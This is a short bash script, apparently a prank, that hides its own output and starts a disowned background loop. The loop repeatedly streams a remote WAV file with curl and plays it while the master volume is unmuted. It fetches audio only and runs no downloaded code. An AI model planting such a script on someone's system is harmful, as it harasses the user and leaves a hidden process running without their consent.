exec >/dev/null
exec 2>/dev/null
while [ 1=1 ];
do
    aplay -q <(curl -s https://unciaur.me/Mandragora.wav);
done & disown &
amixer set Master 15% unmute;